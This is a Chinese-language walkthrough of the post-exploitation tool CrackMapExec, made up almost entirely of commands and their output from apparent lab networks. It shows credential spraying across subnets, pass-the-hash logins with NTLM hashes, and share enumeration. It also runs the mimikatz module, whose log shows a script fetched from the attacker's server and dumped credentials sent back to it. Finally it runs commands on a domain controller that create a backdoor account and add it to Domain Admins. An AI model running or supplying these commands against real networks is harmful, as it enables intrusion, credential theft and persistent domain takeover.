##CrackMapExec

[CrackMapExec (简称CME)](https://github.com/byt3bl33d3r/CrackMapExec/wiki)是一个后渗透工具，其主要用来评估大型活动目录网络的安全性。CME使用了尽可能隐匿自己的技术开发，可绕过IDS/IPS等防御手段。

byt3bl33d3r已经详细的解释过CME的相关功能，本文不再累述，直接引用其中的命令。

```
> crackmapexec smb 10.10.10.52 -u demonas -p 'M374L_P@ssW0rd!'
SMB         10.10.10.52     445    EMPEROR           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:EMPEROR) (domain:KVLT) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    EMPEROR           [+] KVLT\demonas:M374L_P@ssW0rd!

```


```
> crackmapexec smb 10.10.10.1/24 -u demonas -p 'M374L_P@ssW0rd!' --pass-pol
SMB         10.10.10.52     445    EMPEROR           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:EMPEROR) (domain:KVLT) (signing:True) (SMBv1:True)
SMB         10.10.10.40     445    FREEZING-MOON         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:FREEZING-MOON) (domain:FREEZING-MOON) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    MAYHEM            [*] Windows Server 2016 Standard 14393 x64 (name:MAYHEM) (domain:MAYHEM) (signing:False) (SMBv1:True)
SMB         10.10.10.52     445    EMPEROR           [+] KVLT\demonas:M374L_P@ssW0rd! 
SMB         10.10.10.40     445    FREEZING-MOON         [+] FREEZING-MOON\demonas:M374L_P@ssW0rd! 
SMB         10.10.10.59     445    MAYHEM            [-] MAYHEM\demonas:M374L_P@ssW0rd! STATUS_LOGON_FAILURE 
SMB         10.10.10.52     445    EMPEROR           [+] Dumping password info for domain: KVLT
SMB         10.10.10.52     445    EMPEROR           Minimum password length: 7
SMB         10.10.10.52     445    EMPEROR           Password history length: 24
SMB         10.10.10.52     445    EMPEROR           Maximum password age: 
SMB         10.10.10.52     445    EMPEROR           
SMB         10.10.10.52     445    EMPEROR           Password Complexity Flags: 000001
SMB         10.10.10.52     445    EMPEROR               Domain Refuse Password Change: 0
SMB         10.10.10.52     445    EMPEROR               Domain Password Store Cleartext: 0
SMB         10.10.10.52     445    EMPEROR               Domain Password Lockout Admins: 0
SMB         10.10.10.52     445    EMPEROR               Domain Password No Clear Change: 0
SMB         10.10.10.52     445    EMPEROR               Domain Password No Anon Change: 0
SMB         10.10.10.52     445    EMPEROR               Domain Password Complex: 1
SMB         10.10.10.52     445    EMPEROR           
SMB         10.10.10.52     445    EMPEROR           Minimum password age: 
SMB         10.10.10.52     445    EMPEROR           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.52     445    EMPEROR           Locked Account Duration: 30 minutes 
SMB         10.10.10.52     445    EMPEROR           Account Lockout Threshold: None
SMB         10.10.10.52     445    EMPEROR           Forced Log off Time: Not Set
SMB         10.10.10.3      445    FUNERAL-FOG             [*] Unix (name:FUNERAL-FOG) (domain:FUNERAL-FOG) (signing:False) (SMBv1:True)
SMB         10.10.10.3      445    FUNERAL-FOG             [-] FUNERAL-FOG\demonas:M374L_P@ssW0rd! STATUS_LOGON_FAILURE
```

```
> crackmapexec smb 10.10.10.59 -u Sathanas -p 'DeMysteriisDomSathanas!' --shares
SMB         10.10.10.59     445    MAYHEM            [*] Windows Server 2016 Standard 14393 x64 (name:MAYHEM) (domain:MAYHEM) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    MAYHEM            [+] MAYHEM\Sathanas:DeMysteriisDomSathanas! 
SMB         10.10.10.59     445    MAYHEM            [+] Enumerated shares
SMB         10.10.10.59     445    MAYHEM            Share           Permissions     Remark
SMB         10.10.10.59     445    MAYHEM            -----           -----------     ------
SMB         10.10.10.59     445    MAYHEM            ACCT            READ            
SMB         10.10.10.59     445    MAYHEM            ADMIN$                          Remote Admin
SMB         10.10.10.59     445    MAYHEM            C$                              Default share
SMB         10.10.10.59     445    MAYHEM            IPC$    
```

###Pass the Hash

```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth                                                                              2 ↵
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
```

###CME与用户散列对我们的子网:


```
kali :: ~ # cme smb 10.8.14.0/24 -u maniac -H e045c10921635ee21d6bd3b3f64a416f                                                                                                                                    
SMB         10.8.14.12      445    MX01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:MX01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.15      445    WEB01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:WEB01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.11      445    FS01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:FS01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.17      445    RDS02            [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RDS02) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.12      445    MX01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f (Pwn3d!)
SMB         10.8.14.15      445    WEB01            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.10      445    DC01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.11      445    FS01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.14      445    SQL01            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.17      445    RDS02            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f

```

###Shares监视


```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares                            
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
SMB         10.8.14.14      445    SQL01            [+] Enumerated shares
SMB         10.8.14.14      445    SQL01            Share           Permissions     Remark
SMB         10.8.14.14      445    SQL01            -----           -----------     ------
SMB         10.8.14.14      445    SQL01            ADMIN$          READ,WRITE      Remote Admin
SMB         10.8.14.14      445    SQL01            C$              READ,WRITE      Default share
SMB         10.8.14.14      445    SQL01            IPC$                            Remote IPC
```

###Mimikatz


```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth -M mimikatz                         
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
MIMIKATZ    10.8.14.14      445    SQL01            [+] Executed launcher
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.8.14.14                              [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.8.14.14                              [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ    10.8.14.14                              lab\maniac:e045c10921635ee21d6bd3b3f64a416f
MIMIKATZ    10.8.14.14                              LAB\maniac:e045c10921635ee21d6bd3b3f64a416f
MIMIKATZ    10.8.14.14                              LAB\SQL01$:5ad23d25ce4e58d242be7e4acb73fc4d
MIMIKATZ    10.8.14.14                              [+] Added 3 credential(s) to the database
MIMIKATZ    10.8.14.14                              [*] Saved raw Mimikatz output to Mimikatz-10.8.14.14-2018-11-22_122819.log
```
###以域管理员的权限执行命令(创建一个新用户并将其添加到域管理员组):


```
kali :: ~ # cme smb 10.8.14.10 -u dead -H 49a074a39dd0651f647e765c2cc794c7 -X "net user Cat Qwert123!@#$ /add /domain"                                                                                         
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [+] LAB\dead 49a074a39dd0651f647e765c2cc794c7 (Pwn3d!)
SMB         10.8.14.10      445    DC01             [+] Executed command
```


```
kali :: ~ # cme smb 10.8.14.10 -u dead -H 49a074a39dd0651f647e765c2cc794c7 -X 'net group "Domain Admins" /add Cat /domain'                2 ↵
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [+] LAB\dead 49a074a39dd0651f647e765c2cc794c7 (Pwn3d!)
SMB         10.8.14.10      445    DC01             [+] Executed command
```


